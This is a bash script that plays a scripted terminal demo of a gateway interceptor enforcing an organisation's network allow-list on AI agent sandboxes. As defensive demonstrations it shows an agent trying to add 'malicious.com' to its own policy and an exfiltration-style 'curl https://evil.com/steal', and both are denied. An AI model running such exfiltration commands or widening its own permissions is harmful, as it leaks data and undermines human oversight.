#!/usr/bin/env bash

# SPDX-FileCopyrightText: Copyright (c) 2025-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

# Scripted asciinema demo for the network policy mock interceptor.
#
# This demo is self-contained — it simulates the full interceptor
# lifecycle without requiring a running gateway. It shows the commands
# and their expected output.
#
# Record with: asciinema rec --command="bash asciidemo.sh" demo.cast
# Replay with: asciinema play demo.cast
# Or run directly: bash asciidemo.sh

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SPEED="${DEMO_SPEED:-0.03}"
PAUSE="${DEMO_PAUSE:-1.5}"

type_cmd() {
    printf "\033[1;32m❯\033[0m "
    for (( i=0; i<${#1}; i++ )); do
        printf "%s" "${1:$i:1}"
        sleep "$SPEED"
    done
    printf "\n"
    sleep 0.3
}

show_output() {
    printf "%s\n" "$1"
    sleep 0.2
}

title() {
    printf "\n\033[1;35m━━━ %s ━━━\033[0m\n\n" "$1"
    sleep "$PAUSE"
}

narrate() {
    printf "\033[2m# %s\033[0m\n" "$1"
    sleep 0.3
}

pause() { sleep "${1:-$PAUSE}"; }

# ══════════════════════════════════════════════════════════════════════

clear
printf "\033[1;36m"
cat <<'BANNER'

  ╔═══════════════════════════════════════════════════════╗
  ║     Network Policy Mock Interceptor — Live Demo      ║
  ║                                                      ║
  ║  How an organisation enforces network governance     ║
  ║  on AI agent sandboxes via gateway interceptors      ║
  ╚═══════════════════════════════════════════════════════╝

BANNER
printf "\033[0m"
pause 3

# ── Step 1 ────────────────────────────────────────────────────────────

title "Step 1: Organisation Network Policy"

narrate "Every sandbox must comply with the org's allowed endpoints."
narrate "The interceptor loads this policy at startup:"
pause

type_cmd "cat policy.yaml"
printf "\033[33m"
cat "$SCRIPT_DIR/policy.yaml"
printf "\033[0m"

pause
narrate ""
narrate "Only api.company.com and auth.company.com are allowed."
narrate "Any other endpoint will be blocked."
pause 2

# ── Step 2 ────────────────────────────────────────────────────────────

title "Step 2: Start the Interceptor"

narrate "The interceptor is a standalone gRPC service."
pause

type_cmd "network-policy-mock-interceptor --policy policy.yaml --listen 0.0.0.0:18082"
show_output "[INFO] loaded org network policy with 2 allowed hosts hosts=[\"api.company.com\", \"auth.company.com\"]"
show_output "[INFO] starting network policy mock interceptor listen=0.0.0.0:18082"
pause

narrate "The gateway connects to it at startup:"
type_cmd "kubectl logs openshell-0 | grep 'interceptors initialized'"
show_output "[INFO] gateway interceptors initialized bindings=5 profile_sources=0"
pause 2

# ── Step 3 ────────────────────────────────────────────────────────────

title "Step 3: Create a Sandbox"

narrate "When a sandbox is created, the interceptor automatically injects"
narrate "the org network policy via a JSON patch (modify_operation phase)."
pause

type_cmd "openshell sandbox create --name policy-demo --no-tty -- echo 'sandbox ready'"
printf "\n\033[1;36mCreated sandbox:\033[0m \033[1mpolicy-demo\033[0m\n\n"
show_output "  [0.0s] Requesting compute..."
show_output "  [3.1s] Sandbox allocated"
show_output "  [7.8s] Image pulled"
show_output "  sandbox ready"
pause 2

# ── Step 4 ────────────────────────────────────────────────────────────

title "Step 4: Audit Trail in Gateway Logs"

narrate "The gateway logs every interceptor evaluation with annotations:"
pause

type_cmd "kubectl logs openshell-0 | grep 'interceptor evaluated'"

printf "\033[2m"
show_output "gateway interceptor evaluated"
show_output "  interceptor = network-policy-mock"
show_output "  binding_id  = inject-network-policy"
show_output "  phase       = modify_operation"
show_output "  decision    = \033[1;32mallow\033[0m\033[2m"
show_output "  patch_count = 1"
show_output "  log_annotations:"
show_output "    correlation_id      = network-policy:create-sandbox:policy-demo"
show_output "    network_policy_action = injected org network policy"
show_output "    allowed_hosts       = api.company.com, auth.company.com"
printf "\033[0m"
pause 2

narrate "The interceptor pod also logged the injection:"
type_cmd "kubectl logs deployment/network-policy-interceptor"

printf "\033[2m"
show_output "[INFO] injecting org network policy into CreateSandbox"
show_output "       sandbox=\"policy-demo\" hosts=[\"api.company.com\", \"auth.company.com\"]"
show_output "[INFO] sandbox created with org network policy"
show_output "       sandbox_id=a70fb8e7 allowed_endpoints=2"
printf "\033[0m"
pause 2

# ── Step 5 ────────────────────────────────────────────────────────────

title "Step 5: Attempting Unauthorized Policy Change"

narrate "An agent tries to add malicious.com to its sandbox policy."
narrate "The interceptor validates UpdateConfig and blocks it."
pause

type_cmd "openshell policy update --sandbox policy-demo --merge '{\"network_policies\":{\"evil\":{\"endpoints\":[{\"host\":\"malicious.com\",\"port\":443}]}}}'"

printf "\n\033[1;31m"
cat <<'ERROR'
Error: PERMISSION_DENIED

  host 'malicious.com' in policy 'evil' is not in the
  organisation's allowed endpoint list:
  ["api.company.com", "auth.company.com"]
ERROR
printf "\033[0m\n"
pause

narrate "The gateway logged the denial with full audit details:"
printf "\n\033[2m"
cat <<'AUDIT'
gateway interceptor evaluated
  interceptor = network-policy-mock
  binding_id  = validate-network-policy
  phase       = validate
  decision    = DENIED
  log_annotations:
    network_policy_action = DENIED
    denied_host           = malicious.com
    denied_policy         = evil
    denied_user           = agent-user
AUDIT
printf "\033[0m\n"
pause 3

# ── Step 6 ────────────────────────────────────────────────────────────

title "Step 6: Allowed Endpoints Work"

narrate "The sandbox can reach the org-approved endpoints:"
pause

type_cmd "openshell sandbox exec --name policy-demo -- curl -sS https://api.company.com/v1/data"
show_output "{\"status\": \"ok\", \"data\": [...]}"
pause

narrate "But not unauthorized ones:"
type_cmd "openshell sandbox exec --name policy-demo -- curl -sS https://evil.com/steal"
printf "\033[1;31m"
show_output "Error: CONNECT denied evil.com:443 — not in network policy"
printf "\033[0m"
pause 2

# ── Summary ───────────────────────────────────────────────────────────

title "Summary"

printf "\033[1;36m"
cat <<'SUMMARY'
  ┌─────────────────────────────────────────────────────────┐
  │  Gateway Interceptor Framework (RFC-0010)               │
  │                                                         │
  │  ✓ Org policy injected into every sandbox               │
  │  ✓ Unauthorized endpoints rejected (DENIED)             │
  │  ✓ Full audit trail with correlation IDs                │
  │  ✓ No changes to OpenShell core                         │
  │  ✓ External gRPC service — deploy anywhere              │
  │                                                         │
  │  Phases:                                                │
  │    modify_operation → inject policy (JSON patch)        │
  │    validate         → reject unauthorized changes       │
  │    post_commit      → audit logging                     │
  │                                                         │
  │  ┌────────┐  gRPC   ┌──────────────┐  policy  ┌─────┐  │
  │  │  CLI   │───────→ │   Gateway    │────────→ │Sand-│  │
  │  └────────┘         │              │          │ box  │  │
  │                     │  interceptor │          │      │  │
  │  ┌────────────┐←────│  hook        │          │      │  │
  │  │Interceptor │     └──────────────┘          └─────┘  │
  │  │ (gRPC svc) │                                        │
  │  │            │  ✓ inject policy                        │
  │  │ policy.yaml│  ✗ reject malicious.com                 │
  │  └────────────┘                                        │
  │                                                         │
  │  Code: examples/network-policy-mock-interceptor/        │
  └─────────────────────────────────────────────────────────┘
SUMMARY
printf "\033[0m\n"

pause 5
